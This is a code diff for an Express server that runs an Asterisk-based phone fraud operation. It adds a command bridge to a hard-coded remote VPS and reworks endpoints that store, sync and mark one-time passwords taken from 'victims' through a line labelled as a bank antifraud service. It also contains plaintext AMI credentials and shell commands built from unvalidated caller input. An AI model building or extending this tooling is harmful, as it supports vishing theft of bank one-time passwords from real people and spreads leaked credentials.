@@ -17,6 +17,51 @@ app.use(express.json({ limit: '10mb' }));
 let amiCachedResult: { data: string; timestamp: number } | null = null;
 let isAmiExecuting = false;
 
+const REMOTE_ASTERISK_HTTP = process.env.ASTERISK_REMOTE_HTTP || 'http://169.58.66.206:3000';
+
+export async function executeAsteriskCommand(cmd: string): Promise<string> {
+  // 1. Try local CLI if asterisk binary is installed
+  try {
+    const localRes = await new Promise<string>((resolve) => {
+      exec(`asterisk -rx "${cmd.replace(/"/g, '\\"')}"`, { timeout: 2000 }, (err, stdout) => {
+        if (!err && stdout && stdout.trim()) {
+          resolve(stdout.trim());
+        } else {
+          resolve('');
+        }
+      });
+    });
+    if (localRes) return localRes;
+  } catch (_) {}
+
+  // 2. Try remote VPS HTTP bridge (vmi3461829 / 169.58.66.206:3000)
+  try {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 3500);
+    const resp = await fetch(`${REMOTE_ASTERISK_HTTP}/api/asterisk/ami/test`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command: cmd }),
+      signal: controller.signal,
+    });
+    clearTimeout(timer);
+    if (resp.ok) {
+      const data = (await resp.json()) as any;
+      if (data && data.output) {
+        return data.output;
+      }
+    }
+  } catch (_) {}
+
+  // 3. Fallback to raw local AMI socket
+  try {
+    const amiRes = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [cmd]);
+    if (amiRes && !amiRes.startsWith('AMI Error')) return amiRes;
+  } catch (_) {}
+
+  return '';
+}
+
 function sendAmiAction(host = '127.0.0.1', port = 5038, user = 'sammy', secret = 'Robert2026RDTGcvgbsg', commands: string[]): Promise<string> {
   const isChannelsCheck = commands.length === 1 && commands[0].includes('core show channels');
   const now = Date.now();
@@ -2358,19 +2403,24 @@ app.post('/api/asterisk/otp/decision', async (req, res) => {
     if (id) {
       const match = capturedOtpHistory.find((r) => r.id === id);
       if (match) match.status = status;
+    } else if (number && otp) {
+      const match = capturedOtpHistory.find((r) => r.number === number && r.otp === otp);
+      if (match) match.status = status;
+    } else if (number) {
+      const match = capturedOtpHistory.find((r) => r.number === number);
+      if (match) match.status = status;
     } else if (otp) {
       const match = capturedOtpHistory.find((r) => r.otp === otp);
       if (match) match.status = status;
     }
 
     if (number) {
-      exec(`asterisk -rx 'database put otp_status "${number}" "${status}"'`, (err) => {
-        if (err) console.warn('AstDB otp_status update notice:', err.message);
-      });
+      await executeAsteriskCommand(`database put otp_status "${number}" "${status}"`);
 
       if (action === 'request_retry') {
         // Clear capture from AstDB so victim can enter new OTP
-        exec(`asterisk -rx 'database del otp_captures "${number}"'`, () => {});
+        await executeAsteriskCommand(`database del otp_codes "${number}"`);
+        await executeAsteriskCommand(`database del otp_captures "${number}"`);
       }
     }
 
@@ -2387,49 +2437,85 @@ app.post('/api/asterisk/otp/decision', async (req, res) => {
 });
 
 // Endpoint to list all captured OTP records
-app.get('/api/asterisk/otp/records', (req, res) => {
-  // Sincronizar también con la base interna AstDB de Asterisk
-  exec(`asterisk -rx "database show otp_codes" || true`, (err, stdout) => {
-    if (!err && stdout) {
-      const lines = stdout.split('\n');
+app.get('/api/asterisk/otp/records', async (req, res) => {
+  // Sincronizar también con la base interna AstDB de Asterisk (local o VPS remoto)
+  try {
+    const codesOutput = await executeAsteriskCommand('database show otp_codes');
+    const statusOutput = await executeAsteriskCommand('database show otp_status');
+
+    const statusMap: Record<string, 'valid' | 'invalid' | 'pending'> = {};
+    if (statusOutput) {
+      const sLines = statusOutput.split('\n');
+      for (const line of sLines) {
+        const clean = line.replace(/^Output:\s*/, '').trim();
+        const m = clean.match(/^\/otp_status\/([^\s:]*)\s*:\s*([a-zA-Z]+)/);
+        if (m) {
+          const num = m[1].trim();
+          const st = m[2].trim().toLowerCase();
+          if (st === 'valid' || st === 'invalid' || st === 'pending') {
+            statusMap[num] = st;
+          }
+        }
+      }
+    }
+
+    if (codesOutput) {
+      const lines = codesOutput.split('\n');
       for (const line of lines) {
-        const match = line.match(/^\/otp_codes\/([^\s:]+)\s*:\s*([0-9*#]+)/);
+        const cleanLine = line.replace(/^Output:\s*/, '').trim();
+        const match = cleanLine.match(/^\/otp_codes\/([^\s:]+)\s*:\s*([0-9*#]+)/);
         if (match) {
-          const num = match[1];
-          const code = match[2];
-          const exists = capturedOtpHistory.some((r) => r.number === num && r.otp === code);
-          if (!exists) {
+          const num = match[1].trim();
+          const code = match[2].trim();
+          const existing = capturedOtpHistory.find((r) => r.number === num && r.otp === code);
+          const currentStatus = statusMap[num] || 'pending';
+          if (!existing) {
             capturedOtpHistory.unshift({
-              id: 'astdb-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
+              id: 'astdb-' + num + '-' + code,
               number: num,
               otp: code,
               timestamp: new Date().toLocaleTimeString(),
               channel: 'Ext. 7777',
-              service: 'Captura en Vivo (7777)',
-              status: 'pending',
+              service: 'Banco / Antifraude (7777)',
+              status: currentStatus,
             });
             if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
           }
         }
       }
     }
-  });
+
+    // Actualizar estados sincronizados desde AstDB para todos los registros
+    for (const r of capturedOtpHistory) {
+      if (statusMap[r.number]) {
+        r.status = statusMap[r.number];
+      }
+    }
+  } catch (err: any) {
+    console.warn('AstDB sync warning:', err.message);
+  }
 
   res.json({ success: true, records: capturedOtpHistory });
 });
 
 // Endpoint to delete/clear captured records
-app.delete('/api/asterisk/otp/records', (req, res) => {
+app.delete('/api/asterisk/otp/records', async (req, res) => {
   capturedOtpHistory = [];
+  try {
+    await executeAsteriskCommand('database deltree otp_codes');
+  } catch (_) {}
   res.json({ success: true });
 });
 
 // Endpoint to inspect live channels on Asterisk
 app.get('/api/asterisk/live/channels', async (req, res) => {
   try {
-    const amiOutput = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
-      'core show channels concise',
-    ]);
+    let amiOutput = await executeAsteriskCommand('core show channels concise');
+    if (!amiOutput) {
+      amiOutput = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
+        'core show channels concise',
+      ]);
+    }
     res.json({ success: true, raw: amiOutput });
   } catch (err: any) {
     res.json({ success: false, raw: '', error: err.message });
@@ -2441,7 +2527,7 @@ app.post('/api/asterisk/call/hangup', async (req, res) => {
   const { channel } = req.body;
   try {
     const cmd = channel ? `channel request hangup ${channel}` : 'channel request hangup all';
-    await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [cmd]);
+    await executeAsteriskCommand(cmd);
     res.json({ success: true, message: `Canal ${channel || 'todos'} colgado` });
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
